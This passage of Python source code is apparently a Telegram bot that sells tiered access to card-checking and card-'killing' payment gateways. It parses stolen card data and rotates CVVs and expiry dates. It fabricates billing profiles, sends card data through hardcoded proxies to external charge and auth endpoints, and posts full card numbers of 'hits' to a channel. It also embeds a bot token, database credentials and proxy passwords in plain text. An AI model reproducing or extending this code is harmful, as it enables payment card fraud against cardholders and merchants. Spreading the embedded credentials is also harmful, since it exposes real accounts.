import telebot
from telebot import types
import requests, re, time, random, threading, json, secrets, urllib3, logging, sys, os
import functools, inspect, traceback
from datetime import datetime, timedelta
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from pymongo import MongoClient, ReturnDocument
from pymongo.errors import PyMongoError

urllib3.disable_warnings()

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("⚠ beautifulsoup4 missing. Run: pip install beautifulsoup4")

DEBUG = os.getenv("DEBUG", "0") in ("1", "true", "yes")
logging.getLogger('TeleBot').setLevel(logging.CRITICAL)

# ==========================================
# 🔥 CONFIG
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", '9185171475:AAE406JKuUoy0cGgP652jctVeG3pTrYYGPQ')
OWNER_ID = int(os.getenv("OWNER_ID", "6965488457"))
OWNER_USERNAME = "@Hidden_Xman"
BUY_LINK = "t.me/Hidden_Xman"

FORCE_JOIN_CHANNEL = "@PremiumKillerA"
FORCE_JOIN_LINK = "https://t.me/PremiumKillerA"

FORCE_JOIN_UPDATE = "@PremiumKillerB"
FORCE_JOIN_UPDATE_LINK = "https://t.me/PremiumKillerB"
FORCE_JOIN_ENABLED = os.getenv("FORCE_JOIN", "1") in ("1", "true", "yes")

HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004315023445"))
HIT_ENABLED = os.getenv("HIT_ENABLED", "1") in ("1", "true", "yes")

COOLDOWN_USER = int(os.getenv("COOLDOWN_USER", "20"))
COOLDOWN_ADMIN = int(os.getenv("COOLDOWN_ADMIN", "10"))

REQ_TIMEOUT = 15
REQ_T = (6, 10)
PROXY_CHECK_TIMEOUT = 5
MAX_PROXY_STRIKES = 4
BOT_THREADS = 30
KILL_HITS = 10
KILL_WORKERS = 5
COST_PER_KILL = 1

YVEX_AUTH_API = os.getenv("YVEX_AUTH_API", "https://zeroauth-0mtb.onrender.com/cc/")
RBYTE_AUTH_API = os.getenv("RBYTE_AUTH_API", "https://zeroauth2-osw7.onrender.com/cc/")
WEX_AUTH_API = os.getenv("WEX_AUTH_API", "https://zeroauth3.onrender.com/cc/")

BLUEPAY_API_BASE = os.getenv("BLUEPAY_API_BASE", "https://bluepay-6q03.onrender.com")
FATZEBRA_API_BASE = os.getenv("FATZEBRA_API_BASE", "https://fatzebra.onrender.com")
NMI_API_BASE = os.getenv("NMI_API_BASE", "https://nmizebra.onrender.com")

KILLER_GATEWAYS = {
    'k1': {'name': '7Bot', 'func': 'aerojet'},
    'k2': {'name': '4Zap', 'func': 'vibratone'},
    'k3': {'name': '9Byte', 'func': 'dazz'},
    'k4': {'name': '3Hub', 'func': 'microtouch'},
    'k5': {'name': '8Rush', 'func': 'ontel'},
    'k6': {'name': '4Vex', 'func': 'vibratone'},
    'dd': {'name': '4Vex', 'func': 'vibratone'},
    'k7': {'name': '0Dex', 'func': 'vibratone'},
}
HARDCODED_PROXIES = [
    "http://tickets:proxyon145@138.94.218.193:12345",
    "http://9T1GYK9U3S2B:SAWF8Y0JHSB0@5.249.177.8:5433",
    "http://tickets:proxyon145@50.3.137.177:12345"
]

# ==========================================
# 🎨 EMOJIS
# ==========================================
E_BUNNY = '<tg-emoji emoji-id="5278444373615337666">🐰</tg-emoji>'
E_GIFT = '<tg-emoji emoji-id="5231070734016607712">🎁</tg-emoji>'
E_EXCLAMATION = '<tg-emoji emoji-id="5316826301611390284">‼️</tg-emoji>'
E_CHECK = '<tg-emoji emoji-id="5318760565902947324">✅</tg-emoji>'
E_CROSS = '<tg-emoji emoji-id="5316826301611390284">❌</tg-emoji>'
E_WARN = '<tg-emoji emoji-id="5278444373615337666">⚠️</tg-emoji>'
E_FLASH = '<tg-emoji emoji-id="5319070993254201336">⚡</tg-emoji>'
E_LAPTOP = '<tg-emoji emoji-id="5217876375439974417">💻</tg-emoji>'
E_DIZZY = '<tg-emoji emoji-id="5361578245928031497">💫</tg-emoji>'
E_THOUGHT = '<tg-emoji emoji-id="5456125285160226779">💭</tg-emoji>'
E_PICTURE = '<tg-emoji emoji-id="5382205393302756700">🖼</tg-emoji>'
E_FIRE = '<tg-emoji emoji-id="5116414868357907335">🔥</tg-emoji>'
E_HEART = '<tg-emoji emoji-id="5082413149873767213">💙</tg-emoji>'
E_TOOLS = '<tg-emoji emoji-id="5445384340752053491">🛠</tg-emoji>'
E_TECH = '<tg-emoji emoji-id="5323618603411454485">🧑‍💻</tg-emoji>'
E_OCTOPUS = '<tg-emoji emoji-id="5228879218363872764">🐙</tg-emoji>'
E_SHRUG = '<tg-emoji emoji-id="5285432856636569309">🤷‍♂️</tg-emoji>'
E_CROWN = '<tg-emoji emoji-id="5438605241681476089">💎</tg-emoji>'
E_ARROW = '<tg-emoji emoji-id="5258354775757439405">➡️</tg-emoji>'
E_DOTS = '<tg-emoji emoji-id="5465629669829128119">➿</tg-emoji>'
E_STAR = '<tg-emoji emoji-id="5467641505525016018">✨</tg-emoji>'
E_CLOCK = '<tg-emoji emoji-id="5382205393302756700">⏳</tg-emoji>'
E_NUT = '<tg-emoji emoji-id="5215327492738392838">🔩</tg-emoji>'
E_YELLOW = '<tg-emoji emoji-id="5256095704564124362">🟨</tg-emoji>'
E_LINE = E_DOTS * 9

BTN_KILLER = "5116414868357907335"
BTN_GATEWAY = "5319070993254201336"
BTN_PLANS = "5231070734016607712"
BTN_TOOLS = "5445384340752053491"
BTN_ME = "5323618603411454485"
BTN_ADMIN = "5438605241681476089"
BTN_BACK = "5258354775757439405"
BTN_REF = "5082413149873767213"
BTN_WITHDRAW = "5318760565902947324"
BTN_STATS = "5467641505525016018"
BTN_GENPLAN = "5467641505525016018"

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=BOT_THREADS)
try:
    telebot.apihelper.RETRY_ON_ERROR = True
    telebot.apihelper.CONNECT_TIMEOUT = 10
    telebot.apihelper.READ_TIMEOUT = 25
except Exception:
    pass

user_states = {}
BIN_CACHE = {}

# ==========================================
# SAFE HELPERS
# ==========================================
def h_esc(t):
    return (str(t or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))

def html_to_plain(txt):
    txt = re.sub(r'<tg-emoji[^>]*>([^<]*)</tg-emoji>', r'\1', txt)
    txt = re.sub(r'<[^>]+>', '', txt)
    return txt

def safe_reply(msg, text, **kw):
    try: return bot.reply_to(msg, text, **kw)
    except Exception:
        try: return bot.reply_to(msg, html_to_plain(text))
        except Exception as e:
            if DEBUG: print(f"[reply fail] {e}")
            return None

def safe_send(chat_id, text, **kw):
    try: return bot.send_message(chat_id, text, **kw)
    except Exception:
        try: return bot.send_message(chat_id, html_to_plain(text))
        except Exception as e:
            if DEBUG: print(f"[send fail] {e}")
            return None

def safe_edit(chat_id, msg_id, text, **kw):
    if chat_id is None or msg_id is None: return False
    try: return bot.edit_message_text(text, chat_id, msg_id, **kw)
    except Exception as e:
        err = str(e).lower()
        if "message is not modified" in err: return True
        try: return bot.edit_message_text(html_to_plain(text), chat_id, msg_id)
        except Exception as e2:
            if DEBUG: print(f"[edit fail] {e2}")
            return False

def safe_answer(cb_id, text="", **kw):
    try: return bot.answer_callback_query(cb_id, text, **kw)
    except Exception as e:
        if DEBUG: print(f"[answer fail] {e}")
        return False

def crash_guard(name):
    def decorator(fn):
        @functools.wraps(fn)
        def wrapper(*a, **kw):
            try:
                return fn(*a, **kw)
            except Exception as e:
                print(f"[CRASH {name}] {type(e).__name__}: {e}")
                traceback.print_exc()
                try:
                    if not a: return
                    target = a[0]
                    if isinstance(target, telebot.types.CallbackQuery):
                        safe_answer(target.id, "⚠ System busy. Try again.", show_alert=True)
                    elif isinstance(target, telebot.types.Message):
                        safe_reply(target, "⚠ <b>System busy.</b> Try again.", parse_mode='HTML')
                except Exception:
                    pass
        try:
            wrapper.__signature__ = inspect.signature(fn)
        except Exception:
            pass
        return wrapper
    return decorator

# ==========================================
# COOLDOWN
# ==========================================
_last_run = {}
_last_lock = threading.Lock()

def cooldown_left(uid):
    cd = COOLDOWN_ADMIN if is_admin(uid) else COOLDOWN_USER
    with _last_lock:
        last = _last_run.get(uid, 0)
    left = cd - (time.time() - last)
    return max(0, int(left + 0.999))

def mark_run(uid):
    with _last_lock:
        _last_run[uid] = time.time()

# ==========================================
# MONGO
# ==========================================
MONGO_URI = os.getenv("MONGO_URI",
    "mongodb+srv://Ludo:RpfS4DiD5eXvt4dz@cluster0.3zphwiq.mongodb.net/?appName=Cluster0")
MONGO_DB_NAME = os.getenv("MONGO_DB_NAME", "cvex_bot")

mongo = MongoClient(
    MONGO_URI,
    tls=True,
    tlsInsecure=True,
    connect=False,
    maxPoolSize=200, minPoolSize=2,
    serverSelectionTimeoutMS=30000,
    connectTimeoutMS=30000,
    socketTimeoutMS=45000,
    retryWrites=True,
    appname="CVexBot",
)
db = mongo[MONGO_DB_NAME]

db_write_lock = threading.RLock()
_user_cache = {}
_user_cache_lock = threading.Lock()

USER_FIELDS = ['id', 'username', 'credits', 'is_premium', 'is_admin', 'expiry_date',
               'proxies', 'refer_code', 'referred_by', 'banned', 'ref_credits',
               'join_date', 'is_verified']

def _user_tuple(doc):
    if not doc: return None
    return tuple(doc.get(k) for k in USER_FIELDS)

def get_user(uid):
    now = time.time()
    with _user_cache_lock:
        hit = _user_cache.get(uid)
        if hit and now - hit[1] < 5:
            return hit[0]
    try:
        doc = db.users.find_one({"id": int(uid)})
    except Exception as e:
        print(f"[GET USER ERR] {e}")
        return None
    u = _user_tuple(doc)
    with _user_cache_lock:
        _user_cache[uid] = (u, now)
    return u

def invalidate_cache(uid):
    with _user_cache_lock:
        _user_cache.pop(uid, None)

def get_user_by_username(u):
    try:
        name = (u or "").replace('@', '').strip()
        if not name: return None
        doc = db.users.find_one({"username": {"$regex": f"^{re.escape(name)}$", "$options": "i"}})
        return _user_tuple(doc)
    except Exception:
        return None

def resolve_user_target(target):
    if not target: return None
    target = str(target).strip().lstrip('@').strip()
    if not target: return None
    if target.isdigit(): return get_user(int(target))
    return get_user_by_username(target)

def ensure_user(uid, uname="", ref_by=0):
    u = get_user(uid)
    if u is not None: return u
    try:
        create_user(uid, uname or "", ref_by)
        return get_user(uid)
    except Exception as e:
        print(f"[ENSURE_USER] {type(e).__name__}: {e}")
        return None

def _next_seq(name):
    doc = db.counters.find_one_and_update({"_id": name}, {"$inc": {"seq": 1}},
                                          upsert=True, return_document=ReturnDocument.AFTER)
    return int(doc["seq"])

def create_user(uid, uname, ref_by=0):
    notify_ref = False
    with db_write_lock:
        try:
            existing = db.users.find_one({"id": uid})
            jd = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if existing:
                if ref_by and ref_by != uid and not existing.get("referred_by"):
                    db.users.update_one({"id": uid}, {"$set": {"referred_by": ref_by}})
                    db.referrals.insert_one({"referrer_id": ref_by, "referred_id": uid, "date": jd})
                    db.users.update_one({"id": ref_by}, {"$inc": {"ref_credits": 1}})
                    notify_ref = True
                else:
                    return False
            else:
                db.users.insert_one({
                    "id": uid, "username": uname or "", "credits": 5, "is_premium": 0,
                    "is_admin": 0, "expiry_date": "", "proxies": "",
                    "refer_code": secrets.token_urlsafe(8), "referred_by": ref_by or 0,
                    "banned": 0, "ref_credits": 0, "join_date": jd, "is_verified": 0
                })
                if ref_by:
                    db.referrals.insert_one({"referrer_id": ref_by, "referred_id": uid, "date": jd})
                    db.users.update_one({"id": ref_by}, {"$inc": {"ref_credits": 1}})
                    notify_ref = True
        except Exception as e:
            print(f"[CREATE USER ERR] {e}")
            return False
        finally:
            invalidate_cache(uid)
            if ref_by: invalidate_cache(ref_by)

    if notify_ref:
        try:
            ref_u = get_user(ref_by)
            total = ref_u[10] if ref_u else 1
            safe_send(OWNER_ID, f"🔔 <b>NEW REFERRAL!</b>\n{E_LINE}\n👤 <b>New:</b> @{uname or uid}\n🔗 <b>By:</b> @{(ref_u[1] if ref_u and ref_u[1] else ref_by)}\n🆔 <b>Ref ID:</b> <code>{ref_by}</code>\n📊 <b>Total:</b> {total}/5\n{E_LINE}", parse_mode='HTML')
            send_referral_notification(ref_by, uname or uid, total)
        except Exception as e:
            print(f"[REF NOTIFY ERR] {e}")
    return True

def update_credits(uid, amt):
    with db_write_lock:
        try:
            db.users.update_one({"id": uid}, {"$inc": {"credits": amt}})
            invalidate_cache(uid)
        except Exception as e:
            print(f"[UPDATE CREDITS ERR] {e}")

def update_status(uid, field, val):
    with db_write_lock:
        try:
            db.users.update_one({"id": uid}, {"$set": {field: val}})
            invalidate_cache(uid)
        except Exception as e:
            print(f"[UPDATE STATUS ERR] {e}")

def get_setting(key, default=10):
    try:
        doc = db.settings.find_one({"_id": key})
        if not doc: return default
        v = doc.get("value")
        return int(v) if v is not None and str(v).isdigit() else v
    except Exception:
        return default

def set_setting(key, value):
    with db_write_lock:
        db.settings.update_one({"_id": key}, {"$set": {"value": value}}, upsert=True)

def get_default_proxies():
    v = get_setting('default_proxies', '')
    if v:
        try: return json.loads(v)
        except Exception: pass
    return HARDCODED_PROXIES

def _gw_tuple(d):
    if not d: return None
    return (d.get("_id"), d.get("name"), d.get("price"), d.get("cost"),
            d.get("status"), d.get("type"), d.get("format"))

def get_gateway(cmd):
    try: return _gw_tuple(db.gateways.find_one({"_id": cmd}))
    except Exception: return None

def get_gateways(t=None):
    try:
        cur = db.gateways.find({} if not t else {"type": t})
        return [_gw_tuple(d) for d in cur if d]
    except Exception as e:
        print(f"[GET GW ERR] {e}")
        return []

def db_get_user_by_ref_code(code):
    try:
        doc = db.users.find_one({"refer_code": code})
        return doc.get("id") if doc else None
    except Exception:
        return None

def db_activate_plan_code(code, uid):
    with db_write_lock:
        doc = db.plan_codes.find_one({"_id": code, "used_by": 0})
        if not doc: return None
        db.plan_codes.update_one({"_id": code}, {"$set": {
            "used_by": uid, "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}})
        return doc

def db_create_plan_code(plan_name, credits, price, days, uid):
    code = secrets.token_urlsafe(16)
    db.plan_codes.insert_one({
        "_id": code, "plan_name": plan_name, "credits": credits, "price": price,
        "days": days, "created_by": uid,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "used_by": 0, "used_at": ""
    })
    return code

def db_create_withdrawal(uid, amount):
    wid = _next_seq("withdrawals")
    db.withdrawals.insert_one({"_id": wid, "user_id": uid, "amount": amount,
                               "status": "PENDING", "reason": ""})
    return wid

def db_pending_withdrawals():
    return list(db.withdrawals.find({"status": "PENDING"}).sort("_id", 1).limit(20))

def db_approve_withdrawal(wid):
    with db_write_lock:
        doc = db.withdrawals.find_one({"_id": wid})
        if not doc: return None
        db.withdrawals.update_one({"_id": wid}, {"$set": {"status": "APPROVED"}})
        db.users.update_one({"id": doc["user_id"]}, {"$inc": {"credits": doc["amount"]}})
        invalidate_cache(doc["user_id"])
        return doc

def db_decline_withdrawal(wid, reason):
    with db_write_lock:
        doc = db.withdrawals.find_one({"_id": wid})
        if not doc: return None
        db.withdrawals.update_one({"_id": wid}, {"$set": {"status": "DECLINED", "reason": reason}})
        db.users.update_one({"id": doc["user_id"]}, {"$inc": {"ref_credits": doc["amount"]}})
        invalidate_cache(doc["user_id"])
        return doc

def db_set_gateway(cmd, field, value):
    with db_write_lock:
        db.gateways.update_one({"_id": cmd}, {"$set": {field: value}})

def db_add_plan(name, credits, price, days):
    with db_write_lock:
        db.plans.update_one({"_id": name}, {"$set": {
            "credits": credits, "price": price, "days": days,
            "original_price": "", "custom": 0}}, upsert=True)

def db_add_license(key, days):
    db.licenses.insert_one({"_id": key, "days": days, "is_used": 0, "used_by": 0})

def db_all_user_ids():
    return db.users.distinct("id")

GATEWAYS_DATA = [
    ('bl', 'BluePay', '4$', 1, 'ACTIVE', 'CHARGE', 'cc|mm|yy|cvv'),
    ('fat', 'FatZebra', '$1', 1, 'ACTIVE', 'CHARGE', 'cc|mm|yy|cvv'),
    ('nmi', 'NMI', '$5', 1, 'ACTIVE', 'CHARGE', 'cc|mm|yy|cvv'),
    ('yv', 'YVex', '$2.50', 1, 'ACTIVE', 'AUTH', 'cc|mm|yy|cvv'),
    ('rb', 'RByte', '$3.00', 1, 'ACTIVE', 'AUTH', 'cc|mm|yy|cvv'),
    ('6w', '6Wex', '$2.00', 1, 'ACTIVE', 'AUTH', 'cc|mm|yy|cvv'),
    ('k1', '7Bot', '$3.04', 1, 'DEACTIVATED', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k2', '4Zap', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k3', '9Byte', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k4', '3Hub', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k5', '8Rush', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k6', '4Vex', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
    ('k7', '0Dex', '$3.04', 1, 'ACTIVE', 'PREMIUM', 'cc|mm|yy|cvv'),
]

PLANS_DATA = [
    ('SHADOW', 110, '15', 10, '20', 0),
    ('PHANTOM', 220, '29', 18, '35', 0),
    ('REAPER', 330, '39', 25, '50', 0),
    ('GODMODE', 0, '0', 0, '0', 1),
]

def seed_gateways():
    with db_write_lock:
        for cmd, name, price, cost, status, gtype, fmt in GATEWAYS_DATA:
            db.gateways.update_one({"_id": cmd}, {
                "$setOnInsert": {"name": name, "price": price, "cost": cost,
                                 "status": status, "type": gtype, "format": fmt}
            }, upsert=True)
            db.gateways.update_one({"_id": cmd}, {"$set": {"name": name, "status": status}})

def seed_plans():
    with db_write_lock:
        for name, credits, price, days, orig, custom in PLANS_DATA:
            db.plans.update_one({"_id": name}, {
                "$set": {"credits": credits, "price": price, "days": days,
                                 "original_price": orig, "custom": custom}
            }, upsert=True)

def ensure_owner_in_db():
    with db_write_lock:
        try:
            doc = db.users.find_one({"id": OWNER_ID})
            if not doc:
                db.users.insert_one({
                    "id": OWNER_ID, "username": "owner", "credits": 999999,
                    "is_premium": 0, "is_admin": 1, "expiry_date": "", "proxies": "",
                    "refer_code": secrets.token_urlsafe(8), "referred_by": 0,
                    "banned": 0, "ref_credits": 0,
                    "join_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "is_verified": 1
                })
                print(f"   ✓ Owner auto-created (ID: {OWNER_ID})")
            else:
                upd = {}
                if not doc.get("is_admin"): upd["is_admin"] = 1
                if not doc.get("is_verified"): upd["is_verified"] = 1
                if upd: db.users.update_one({"id": OWNER_ID}, {"$set": upd})
                print(f"   ✓ Owner in DB (credits: {doc.get('credits')})")
            invalidate_cache(OWNER_ID)
        except Exception as e:
            print(f"   ✗ Owner ensure failed: {e}")

def normalize_users():
    with db_write_lock:
        try:
            for doc in db.users.find({"$or": [{"refer_code": {"$in": [None, ""]}},
                                              {"refer_code": {"$exists": False}}]}):
                db.users.update_one({"_id": doc["_id"]},
                                    {"$set": {"refer_code": secrets.token_urlsafe(8)}})
            defaults = {"username": "", "credits": 5, "is_premium": 0, "is_admin": 0,
                        "expiry_date": "", "proxies": "", "referred_by": 0, "banned": 0,
                        "ref_credits": 0, "is_verified": 0}
            for f, v in defaults.items():
                db.users.update_many({f: {"$exists": False}}, {"$set": {f: v}})
        except Exception as e:
            print(f"[NORMALIZE ERR] {e}")

def init_db():
    try:
        db.users.create_index("id", unique=True)
        db.users.create_index("refer_code", unique=True, sparse=True)
        db.users.create_index("username")
        db.withdrawals.create_index("status")
        db.plan_codes.create_index("used_by")
        seed_gateways()
        seed_plans()
    except Exception as e:
        print(f"[INIT DB ERR] {e}")

# ==========================================
# NOTIFICATIONS
# ==========================================
def send_premium_sticker(chat_id, context="welcome"):
    st = get_setting('sticker_id', '')
    if not st or not isinstance(st, str) or not st.strip(): return False
    st = st.strip()
    try:
        if st.startswith('http://') or st.startswith('https://'):
            bot.send_photo(chat_id, st)
        else:
            bot.send_sticker(chat_id, st)
        return True
    except Exception:
        return False

def send_credit_notification(uid, amount):
    try:
        send_premium_sticker(uid, "credit")
        safe_send(uid,
            f"{E_GIFT} <b>Credits Received!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_HEART} Amount : <b>{amount:+d} credits</b>\n"
            f"╰┈➤ {E_CROWN} From : <b>Admin</b>\n"
            f"╰┈➤ {E_FLASH} Status : <b>Active</b>\n"
            f"{E_LINE}\n{E_ARROW} Use /cmds to start", parse_mode='HTML')
    except Exception:
        pass

def send_premium_notification(uid, days, expiry):
    try:
        send_premium_sticker(uid, "premium")
        safe_send(uid,
            f"{E_CROWN} <b>Premium Activated!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_STAR} Plan : <b>Premium</b>\n"
            f"╰┈➤ {E_FLASH} Duration : <b>{days} days</b>\n"
            f"╰┈➤ {E_HEART} Expires : <b>{expiry}</b>\n"
            f"╰┈➤ {E_CHECK} Status : <b>Active</b>\n"
            f"{E_LINE}\n{E_ARROW} Killer gateways unlocked!", parse_mode='HTML')
    except Exception:
        pass

def send_withdraw_approved(uid, amount):
    try:
        send_premium_sticker(uid, "withdraw")
        safe_send(uid,
            f"{E_CHECK} <b>Withdrawal Approved!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_HEART} Amount : <b>{amount} credits</b>\n"
            f"╰┈➤ {E_FLASH} Status : <b>Approved</b>\n{E_LINE}", parse_mode='HTML')
    except Exception:
        pass

def send_withdraw_declined(uid, reason, amount):
    try:
        send_premium_sticker(uid, "withdraw")
        safe_send(uid,
            f"{E_CROSS} <b>Withdrawal Declined</b>\n{E_LINE}\n"
            f"╰┈➤ {E_WARN} Reason : <b>{reason}</b>\n"
            f"╰┈➤ {E_HEART} Refund : <b>{amount} refs</b>\n{E_LINE}", parse_mode='HTML')
    except Exception:
        pass

def send_referral_notification(ref_uid, new_user, total):
    try:
        send_premium_sticker(ref_uid, "referral")
        safe_send(ref_uid,
            f"{E_HEART} <b>New Referral!</b>\n{E_LINE}\n"
            f"╰┈➤ {E_TECH} User : <b>@{new_user}</b>\n"
            f"╰┈➤ {E_STAR} Total : <b>{total}/5</b>\n"
            f"{E_LINE}\n{E_FLASH} 5 refs = 5 credits withdraw", parse_mode='HTML')
    except Exception:
        pass

# ==========================================
# HIT CHANNEL
# ==========================================
def send_hit(gname, price, card_line, uname, took, killed=0, failed=0,
             status_line="DECLINED", bin_no=None, kind="KILL", tag=""):
    if not HIT_ENABLED: return
    try:
        b = bin_no or card_line.split('|')[0][:6]
        bank, brand, ctype, country, flag = get_bin(b)
        ok = status_line in ("CHARGED", "ADDED", "APPROVED")

        if kind == "KILLER":
            head = "🔥 <b>KILLER HIT</b>" if ok else "📉 <b>KILLER DECLINE</b>"
        elif kind == "AUTH":
            head = "💳 <b>APPROVED CC</b>" if ok else "📉 <b>DECLINED CC</b>"
        else:
            head = "💸 <b>CHARGED</b>" if ok else "📉 <b>DECLINED</b>"

        if kind == "AUTH":
            mid = f"{E_CHECK} <b>Result</b> ↠ <b>Card Approved</b>\n"
        else:
            mid = (f"{E_CHECK} <b>Killed</b> ↠ ({killed}) | "
                   f"{E_CROSS} <b>Failed</b> ↠ ({failed})\n")

        tail = f" | {tag}" if tag else ""
        txt = (f"{head} | <b>{h_esc(gname)}</b> [{h_esc(price)}] | #{h_esc(b)}{tail}\n"
               f"──────•❥❥•──────\n"
               f"{E_TECH} <b>CC</b> ↠ <code>{h_esc(card_line)}</code>\n"
               f"{mid}"
               f"{E_FLASH} <b>Status</b> ↠ <b>{h_esc(status_line)}</b>\n"
               f"──────•❥❥•──────\n"
               f"{E_TOOLS} <b>Bank</b> ↠ {h_esc(bank)}\n"
               f"{E_OCTOPUS} <b>Info</b> ↠ {brand} | {ctype}\n"
               f"{E_DIZZY} <b>Country</b> ↠ {h_esc(country)} {flag}\n"
               f"──────•❥❥•──────\n"
               f"{E_THOUGHT} <b>Took</b> ↠ {took}s | @{h_esc(uname)}")
        m = bot.send_message(HIT_CHANNEL_ID, txt, parse_mode='HTML', disable_web_page_preview=True)
        print(f"[HIT] id={getattr(m, 'message_id', '?')} | {card_line} | {status_line} {tag}")
    except Exception as e:
        print(f"[HIT SEND ERR] {type(e).__name__}: {e}")

# ==========================================
# PROXY / SESSION
# ==========================================
PROXY_STRIKES = {}
CACHE_LOCK = threading.Lock()

def proxy_strike(p):
    if not p: return
    with CACHE_LOCK:
        PROXY_STRIKES[p] = PROXY_STRIKES.get(p, 0) + 1

def is_proxy_burned(p):
    if not p: return False
    with CACHE_LOCK:
        return PROXY_STRIKES.get(p, 0) >= MAX_PROXY_STRIKES

def reset_strikes():
    with CACHE_LOCK:
        PROXY_STRIKES.clear()

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
]

def fresh_session(proxy_str=None):
    s = requests.Session()
    ad = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
    s.mount("http://", ad)
    s.mount("https://", ad)
    s.verify = False
    s.headers.update({
        "User-Agent": random.choice(UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    return s

def close_session(s):
    try: s.close()
    except Exception: pass

def get_proxy_info(p):
    m = re.search(r'@([^:]+)', p) or re.search(r'://([^:]+)', p)
    if not m: return None
    try:
        r = requests.get(f"http://ip-api.com/json/{m.group(1)}?fields=status,country,city,isp,query", timeout=4)
        d = r.json()
        if d.get('status') == 'success':
            return {"ip": d.get('query'), "country": d.get('country'), "city": d.get('city'), "isp": d.get('isp')}
    except Exception:
        pass
    return None

def check_proxy(p):
    try:
        r = requests.get("https://www.google.com", proxies={"http": p, "https": p},
                         timeout=PROXY_CHECK_TIMEOUT, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def alive_proxies(lst, cap=12):
    if not lst: return [None]
    lst = lst[:cap]
    alive = []
    with ThreadPoolExecutor(max_workers=max(1, len(lst))) as ex:
        for p, ok in ex.map(lambda x: (x, check_proxy(x)), lst):
            if ok: alive.append(p)
    return alive if alive else [None]

# ==========================================
# CARD HELPERS
# ==========================================
F_NAMES = ["James", "Emma", "Liam", "Olivia", "Noah", "Ava", "Ethan", "Sophia", "Mason", "Isabella"]
L_NAMES = ["Carter", "Bennett", "Hayes", "Brooks", "Foster", "Sullivan", "Reed", "Parker", "Collins", "Murphy"]
CITIES = [("New York", "10001", "34"), ("Brooklyn", "11201", "34"), ("Queens", "11375", "34"),
          ("Bronx", "10451", "34"), ("Chicago", "60601", "14"), ("Houston", "77001", "43")]

def parse_card(raw):
    p = [x.strip() for x in (raw or "").split("|")]
    if len(p) != 4: raise ValueError("Invalid")
    n, mo, y, cvv = p
    if len(y) == 2: y = "20" + y
    if not n.isdigit() or not (12 <= len(n) <= 19): raise ValueError("Number")
    if not y.isdigit() or not (2024 <= int(y) <= 2050): raise ValueError("Year")
    if not mo.isdigit() or not (1 <= int(mo) <= 12): raise ValueError("Month")
    if not cvv.isdigit() or len(cvv) < 3: raise ValueError("CVV")
    return {"number": n, "month": str(int(mo)).zfill(2), "year": y, "cvv": cvv, "bin": n[:6]}

def rotate_cvvs(orig, n):
    if not orig or len(orig) < 3: return [orig] * int(n)
    prefix = orig[:-1]; start = int(orig[-1])
    return [f"{prefix}{(start + i) % 10}" for i in range(int(n))][:int(n)]

def gen_mm_yy_list(orig_mm, orig_yy, n):
    now = datetime.now(); cy, cm = now.year, now.month
    out = [(str(orig_mm).zfill(2), orig_yy)]
    for _ in range(int(n) - 1):
        y = random.randint(cy, cy + 5)
        m = random.randint(cm, 12) if y == cy else random.randint(1, 12)
        out.append((str(m).zfill(2), str(y)))
    return out

def gen_profile():
    fn = random.choice(F_NAMES); ln = random.choice(L_NAMES); city, zp, st = random.choice(CITIES)
    return {"first_name": fn, "last_name": ln,
            "email": f"{fn.lower()}.{ln.lower()}{random.randint(10, 9999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}",
            "phone": f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}",
            "address1": f"{random.randint(100, 9999)} Main St", "address2": "", "zip": zp,
            "city": city, "state_id": st, "country_id": "1"}

# ==========================================
# BIN
# ==========================================
def get_bin(bin_num):
    if bin_num in BIN_CACHE: return BIN_CACHE[bin_num]
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={"Accept-Version": "3"},
                         timeout=3, verify=False)
        if r.status_code == 200:
            d = r.json()
            res = (d.get('bank', {}).get('name', 'Unknown'), d.get('scheme', 'UNK').upper(),
                   d.get('type', 'UNK').upper(), d.get('country', {}).get('name', 'Unknown'),
                   d.get('country', {}).get('emoji', '🏳️'))
            BIN_CACHE[bin_num] = res
            return res
    except Exception:
        pass
    return "Unknown", "UNKNOWN", "UNKNOWN", "Unknown", "🏳️"

def prefetch_bin(bin_num):
    box = {}
    def run():
        try: box['v'] = get_bin(bin_num)
        except Exception: pass
    t = threading.Thread(target=run, daemon=True)
    t.start()
    return t, box

def bin_info_or(box, timeout=2.5):
    if box.get('v'): return box['v']
    return ("Unknown", "UNKNOWN", "UNKNOWN", "Unknown", "🏳️")

# ==========================================
# ANALYZER
# ==========================================
DECLINE_PHRASES = [
